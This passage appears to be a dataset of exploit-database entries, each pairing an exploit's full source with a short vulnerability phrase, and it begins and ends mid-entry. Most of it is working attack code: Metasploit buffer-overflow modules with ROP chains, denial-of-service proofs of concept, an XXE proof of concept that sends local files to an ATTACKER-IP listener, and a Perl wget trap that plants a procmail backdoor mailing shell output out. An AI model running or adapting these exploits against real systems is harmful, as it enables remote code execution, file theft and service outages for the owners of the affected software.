[0x808dd70].pack(""V"")                      # pop eax ; pop ebx ; pop ebp ; ret     rop << [0xf7f61cd0 + ov_base + 0x1dae6].pack(""V"") # eax: ptr to 'call _system' sequence                                                       #.text:0001DAE6  lea     eax, [ebp+dest] (dest = -0x1028)                                                       #.text:0001DAEC  push    eax             ; command                                                       #.text:0001DAED  call    _system     rop << [0x08097160].pack(""V"")                     # ebx: ptr to .data where user controlled string will be stored:                                                       # ""PMD Stack option specified, but stack not available (user_controlled)""     rop << rand_text_alpha(4)                         # ebp: padding     rop << [0x804fb86].pack(""V"")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)     rop << [0x8049ac4].pack(""V"")                      # xchg eax, edi ; ret     rop << [0x808dd70].pack(""V"")                      # pop eax ; pop ebx ; pop ebp ; ret     rop << [0xf7f61cd0 + ov_base + 0x47f1c].pack(""V"") # eax: libov .got base     rop << rand_text_alpha(4)                         # ebx: padding     rop << [0x8097160 + 4764].pack(""V"")               # ebp: ptr to our controlled data in .data (+0x1028 to compensate)     rop << [0x804fb86].pack(""V"")                      # add eax 0x809e330 ; add ecx ecx ; ret (control eax)     rop << [0x805a58d].pack(""V"")                      # xchg ebx eax ; and eax 0xc4830001 ; and cl cl ; ret (ebx: libov .got)     rop << [0x8049ac4].pack(""V"")                      # xchg eax, edi ; ret ; (eax: call to system sequence from libov)     rop << [0x80528BC].pack(""V"")                      # jmp eax      rop   end    def stack_option_pkt(t, ov_base)     hdr = [0x2a9].pack(""V"")             # stack_option packet     data = ""-SA""                        # stack name (invalid one 'A')     data << "";""                         # separator     data << self.send(t[:rop], ov_base) # malformed stack options     data << payload.encoded     data << "";\n""     data << ""\x00"" * (0xfa4 - data.length - hdr.length)      hdr + data   end    def proto_tbl_pkt     hdr = [0x2aa].pack(""V"") # proto_tbl packet     data = ""\x00"" * (0xfa4 - hdr.length)      hdr + data   end    def base(address, offset)     address - offset   end    def find_ov_base(t, data)     print_status(""Searching #{t.name} pointers..."")     i = 0     data.unpack(""V*"").each do |int|       if base(int, t['ov_offset']) % 0x1000 == 0         print_status(""Pointer 0x#{int.to_s(16)} found at offset #{i * 4}"")         @ov_base = base(int, t['ov_offset'])         return true       end       i = i + 1     end      false   end    def auto_target(data)     targets.each do |t|       next if t.name == 'Automatic'       if find_ov_base(t, data)         return t       end     end      nil   end  end",uses a proto_tbl packet,1
13920,"H264WebCam - Boundary Condition Error /*    DISCLAIMER       THIS PROGRAM IS NOT INTENDED TO BE USED ON OTHER COMPUTERS AND IT IS DESTINED FOR PERSONAL RESEARCH ONLY!!!!    Also the free software programs provided by fl0 fl0w may be freely distributed and that the disclaimer below is always attached to it.    The programs are provided as is without any guarantees or warranty.    Although the author has attempted to find and correct any bugs in the free software programs,       the author is not responsible for any damage or losses of any kind caused by the use or misuse of the programs.    The author is under no obligation to provide support, service, corrections, or upgrades to the free software programs.           Author:           fl0 fl0w    Software:         H264WebCam       Dl link:          http://www.h264soft.com/downloads/H264WebCam_Setup.exe        Afected Versions: 3.7    Remote:           Yes    Local:            No    Class:            Boundary Condition Error    Bug:              HTTP server process termination    Afected software: Windows 98/Me/2000/XP/2003/Vista/7/NT   	    Fix:              No fix        Compiler:         gcc version 3.4.4 (cygming special, gdc 0.12, using dmd 0.125)      Advice:           To avoid any problems under Windows use cygwin console.       The .C code:  */ #include<stdio.h> #include<sys/types.h> #include<sys/socket.h> #include<netinet/in.h> #include<unistd.h>      typedef int i32;      typedef char i8;      typedef short i16; #define BOF     ""test"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \                 ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" \ 				""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""                               #define SEND(sockets) if(send(sockets,sendbytes,sizeof(sendbytes),0)<0) \                   shutdown(x,1)            #define CONNECT(sockets) if(connect(sockets,(struct sockaddr*)&s,sizes)<0) \                       return 0; #define BUFFSZ 9999999                      #define GET1 ""GET /"" #define GET2 "" HTTP/1.0\r\n"" \                ""\r\n"" #define ALOC(tip,n) (tip*)malloc(sizeof(tip)*n) #define VER ""3.7"" #define POCNAME ""-H264WebCam PoC "" VER         void copy_str(i8*,i8*,i32);         void get_arguments(i32,i8**);         void error_handle(void); 		void mset(i8*,i32,i32); 		void syntax(); 		i8* recvbytes, 		     * sendbytes, 			 * host, 			 * option; 		i16    port;	  		i32    sizes, 			   sockets, 			   x; 			struct sockaddr_in s;         i32 main(i32 argc,i8** argv){ 		    printf(""%s"",POCNAME); 		    sendbytes=ALOC(i8,BUFFSZ);  			recvbytes=ALOC(i8,BUFFSZ); 			 			if(!sendbytes) 			  error_handle(); 			if(!recvbytes) 			  error_handle();   			               get_arguments(argc,argv); 		             			sizes=sizeof(s);                  s.sin_family=AF_INET;             s.sin_addr.s_addr=inet_addr(host);             s.sin_port=htons(port);             printf(""-connection established\n""); 			     for(;;){   			             x++;                          sockets=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 					     if(sockets<0){ 					     printf(""line 81"");                           error_handle();                         }			            					   if(strcmp(option,""get"")==0){		              		      copy_str(sendbytes,GET1,5); 						  copy_str(sendbytes+5,BOF,sizeof(BOF)); 					      copy_str(sendbytes+5+strlen(BOF),GET2,17); 					   } 					    					   CONNECT(sockets);                         			           SEND(sockets);                        			     }           		 printf(""[*]Done!\n"");        return 0;       }         void copy_str(i8* v,i8* w,i32 len){                    strncpy(v,w,len);         } 		void get_arguments(i32 argc,i8** argv){               if(argc<6){ 			             syntax(); 					     exit(0);		 			  }else{                       i32 i;                      argc--;                      for(i=1;i<argc;i++){                          switch(argv[i][1]){                                case'h':                                        host=argv[++i];                                break;                                case'p':                                        port=atoi(argv[++i]);                                break;              							   case'o': 								       option=argv[++i]; 							   break;		                                   default:{                                        printf(""error with argument nr %d:(%s)\n"",i,argv[i]); 									   exit(0);                                 }                               }                                     }               }            }           void error_handle(void){                    perror(""\nError"");                    exit(1);           } 		  void syntax(){              i8 *help[]={""\torder of arguments: -h,-p,-o"", 			             ""\t-h hostname"",                          ""\t-p port(default 80)"", 						 ""\t-o option(get)""                 };                 i32 i;                 size_t com=sizeof help / sizeof help[0];                 for(i=0;i<com;i++){                    printf(""%s\n"",help[i]);                 } 		  }",a specially crafted request packet,1
16409,"CA BrightStor ARCserve for Laptops & Desktops LGServer - Remote Buffer Overflow (Metasploit) (2) ## # $Id: lgserver_rxsuselicenseini.rb 10892 2010-11-03 22:09:44Z mc $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'CA BrightStor ARCserve for Laptops & Desktops LGServer Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup 				for Laptops & Desktops 11.1. By sending a specially crafted request (rxsUseLicenseIni), an 				attacker could overflow the buffer and execute arbitrary code. 			}, 			'Author'         => [ 'MC' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 10892 $', 			'References'     => 				[ 					[ 'CVE', '2007-3216' ], 					[ 'OSVDB', '35329' ], 					[ 'BID', '24348' ], 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 700, 					'BadChars' => ""\x00"", 					'StackAdjustment' => -3500, 				}, 			'Platform' => 'win', 			'Targets'  => 				[ 					[ 'Windows 2003 SP0 English',	{ 'Ret' => 0x71ae1f9b } ], 					[ 'Windows 2000 SP4 English',	{ 'Ret' => 0x75031dce } ], 				], 			'DisclosureDate' => 'Jun 6 2007', 			'DefaultTarget' => 0))  		register_options([ Opt::RPORT(1900) ], self.class) 	end  	def check 		connect  		sock.put(""0000000019rxrGetServerVersion"") 		ver = sock.get_once  		disconnect  		if ( ver =~ /11.1.742/ ) 				return Exploit::CheckCode::Vulnerable 		end  		return Exploit::CheckCode::Safe 	end  	def exploit 		connect  		data  = rand_text_alpha_upper(4108) + [target.ret].pack('V') 		data << payload.encoded + rand_text_alpha_upper(rand(300) + 1)  		sploit  = ""0000004820""         # Command Length Field 		sploit << ""rxsUseLicenseIni""   # RPC Command 		sploit << ""~~""                 # Constant Argument Delimiter 		sploit << data  		print_status(""Trying target #{target.name}..."") 		# One-shot overwrite... 		sock.put(sploit)  		handler 		disconnect 	end  end",sending a specially crafted request (rxsUseLicenseIni),1
28648,"FreeBSD 5.x - 'I386_Set_LDT()' Multiple Local Denial of Service Vulnerabilities // source: https://www.securityfocus.com/bid/20158/info  FreeBSD is prone to multiple local denial-of-service vulnerabilities. These issues occur because of input-validation flaws related to the handling of integers.  An attacker may leverage these issues to cause the affected computer to crash, denying service to legitimate users.  Versions 5.2 through 5.5 are vulnerable to these issues; other versions may also be affected.  #include <stdio.h> #include <stdlib.h> #include <machine/segments.h> #include <machine/sysarch.h>  int main(int argc,char **argv){      if(i386_set_ldt(LUDATA_SEL+1,NULL,-1)==-1){         perror(""i386_set_ldt"");         exit(EXIT_FAILURE);     }      exit(EXIT_FAILURE); }",malformed data,1
40861,"Microsoft Windows Media Center 6.1.7600 - 'ehshell.exe' XML External Entity Injection [+] Credits: John Page aka hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-MEDIA-CENTER-XXE-FILE-DISCLOSURE.txt  [+] ISR: ApparitionSec    Vendor: ================== www.microsoft.com    Product: ================================== Windows Media Center ""ehshell.exe"" version 6.1.7600    Vulnerability Type: ==================== XML External Entity    CVE Reference: ============== N/A    Vulnerability Details: =====================  Windows Media Center ""ehshell.exe"" is vulnerable to XML External Entity attack allowing remote access to ANY files on a victims computer, if they open an XXE laden "".mcl"" file via a remote share / USB or from an malicious ""windowsmediacenterweb"" web link.  Sometimes 'Windows Media Center' will crash, sometimes opens normally and other times will not open, but the files get accessed and exfiltrated.   Tested Windows 7 SP1    Exploit code(s): ===============  POC exfiltrate ""msdfmap.ini"" used by MS ADO Remote Data Services.   1) ATTACKER-IP listener python -m SimpleHTTPServer 8080    2) Create the ""FindMeThatBiotch.dtd"" DTD file with below contents (host on ATTACKER-IP in directory where python server is listen)  <!ENTITY % param666 ""<!ENTITY &#x25; FindMeThatBiotch SYSTEM ' http://ATTACKER-IP:8080/%data666;'>"">    3) Create the ""EVIL.mcl"" file.   <?xml version=""1.0""?> <!DOCTYPE hyp3rlinx [ <!ENTITY % data666 SYSTEM ""c:\Windows\msdfmap.ini""> <!ENTITY % junk SYSTEM ""http://ATTACKER-IP:8080/FindMeThatBiotch.dtd""> %junk; %param666; %FindMeThatBiotch; ]>    4) Get victim to open the EVIL.mcl ... enjoy your files!  OR create link on webpage to run the file, but ""user has to consent first"".  <a href=""windowsmediacenterweb://ATTACKER-IP:8080/EVIL.mcl"">XXE POC</a>    Disclosure Timeline: ======================================= Vendor Notification:  September 1, 2016 Vendor opens Case 34970: September 6, 2016 Vendor reply ""Wont Fix"" : October 19, 2016 December 4, 2016 : Public Disclosure     Exploitation Technique: ======================= Remote    Severity Level: ================ High     [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.  hyp3rlinx","open an XXE laden "".mcl "" file",1
24813,"GNU Wget 1.x - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/11871/info  Multiple remote vulnerabilities reportedly affect GNU wget. These issues are due to the application's failure to properly sanitize user-supplied input and to properly validate the presence of files before writing to them. The issues include:  - a potential directory-traversal issue - an arbitrary file-overwriting vulnerability - a weakness caused by the application's failure to filter potentially malicious characters from server-supplied input.   Via a malicious server, an attacker may exploit these issues to arbitrarily overwrite files within the current directory and potentially outside of it. This may let the attacker corrupt files, cause a denial of service, and possibly launch further attacks against the affected computer. Overwriting of files would take place with the privileges of the user that activates the vulnerable application.   --  )^o-o^|    jabber: rdancer@NJS.NetLab.Cz  | .v  K    e-mail: jjminar FastMail FM  `  - .'     phone: +44(0)7981 738 696   \ __/Jan     icq: 345 355 493  __|o|__Min??  irc: rdancer@IRC.FreeNode.Net  #!/usr/bin/perl -W # wgettrap.poc -- A POC for the wget(1) directory traversal vulnerability # # Copyright 2004 Jan Min???? (jjminar fastmail fm) # License: Public Domain # # When wget connects to us, we send it a HTTP redirect constructed so that wget # wget will connect the second time, it will be attempting to override # ~/.procm4ilrc (well, provided that the user running wget has username 'jan' # 8-)).  use POSIX qw(strftime);  # This is our scheme/host/port $server = ""http://localhost:31340""; # Use this + DNS poisoning with wget 1.9 & CVS #$server = ""http://.."";  # Wanna know who got infected? #$log = ""/dev/pts/1"";  # The filename we will try to overwrite on the target system $filename = ""/home/jan/.procm4ilrc%00This%20part%20will%20be%20ignored."";  ############### Payload ######################################### $email = 'your@mailbox'; $password = 'Pmrpuf ner cevzvgvirf'; $payload = <<EOP; :0c | mail -s 'Wgettrap mail copy' $email :0 * ^X-Wgettrap-Command: shell * ^X-Wgettrap-Password: $password | /bin/sh -c '/bin/sh | mail -s ""Wgettrap shell output"" $email' EOP chomp $payload; ############### Payload #########################################  # A simple directory traversal, for greater effect $trick = ""/.."" . ""%2f.."" x 40;  open LOG, "">$log"" if $log;  while(<STDIN>){         print LOG $_ if $log;         if (/\Q$trick$filename\E/) {         #if (/%2f/) {                 # We see the filename, so this is the second time                 # they're here.  Time to feed the sploit.                 $second++;         } elsif (/^Range: bytes=\(33\)-/) {                 # Appending goes like this:                 # (1) Tell'em what you're gonna tell'em                 # (2) Then tell'em just a half                 # (3) Close it                 # (4) Wait                 # (5) They're comin' back, with wget -c                 # (6) Tell'em the sploit                 # (7) Close again                 # (8) Wtf? They're comin' back with wget -c again                 # (9) Tell'em the rest...                 # (10) ... enjoying the backdoor at the same time                 print LOG ""File if $1 bytes long\n"" if $log;         } elsif (/^\r?$/) {                 # The HTTP headers are over.  Let's do it!                 $date = strftime (""%a, %e %b %Y %H:%M:%S %z"", localtime);                 if (!$second) {                         # Print the payload                         print <<EOT; HTTP/1.1 301 Moved Permanently\r Date: $date\r Server: wgettrap 1.1\r Accept-Ranges: bytes\r Location: $server$trick$filename\r Content-Length: 43\r Connection: close\r Content-Type: text/html\r \r <html><head><title></title></head></html>\r EOT                 } else {                         # Print the redirection                         print <<EOT; HTTP/1.1 200 OK\r Date: $date\r Server: wgettrap 1.1\r Accept-Ranges: bytes\r Content-Length: 25\r Connection: close\r Content-Type: text/plain\r \r $payload EOT                 }                 exit 0;         } }",the malicious file,1
18337,"M-Player 0.4 - Local Denial of Service #!/usr/bin/perl  # Exploit Title: M-Player 0.4 Local Denial of Service Vulnerability # Date: 08/01/2012 # Author: JaMbA # Download: http://www.softpedia.com/get/Multimedia/Audio/Audio-Players/M-Player.shtml # Version: 0.4 # Tested on: Windows 7  my $file= ""Crash.mp3""; my $junk= ""\x41"" x 2048; open($FILE,"">$file""); print $FILE $junk; print ""\nCrash.mp3 File Created successfully\n""; print ""\ I'am From Tunisia (Ahmadso best Friend)\n""; print ""\ Dz-Devloper Work Team (wanted_29  Dr.Smt  z4k!_xy  ak27 DR.KIM Samoray Mr_Ghost)\n""; close($FILE);",a specially crafted .mp3 file,1
16804,"Belkin Bulldog Plus - Web Service Buffer Overflow (Metasploit) ## # $Id: belkin_bulldog.rb 9262 2010-05-09 17:45:00Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Belkin Bulldog Plus Web Service Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in Belkin Bulldog Plus 				4.0.2 build 1219. When sending a specially crafted http request, 				an attacker may be able to execute arbitrary code. 			}, 			'Author'         => [ 'MC' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9262 $', 			'References'     => 				[ 					[ 'OSVDB', '54395' ], 					[ 'BID', '34033' ], 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 750, 					'BadChars' => ""\x00"", 					'StackAdjustment' => -3500, 					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper, 					'DisableNops'  =>  'True', 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP3 English', { 'Ret' => 0x7e4456f7 } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Mar 8 2009'))  		register_options( [ Opt::RPORT(80) ], self.class ) 	end  	def exploit 		c = connect  		dwerd = Metasm::Shellcode.assemble(Metasm::Ia32.new, ""call dword [esp+58h]"").encode_string  		filler = [target.ret].pack('V') + dwerd + 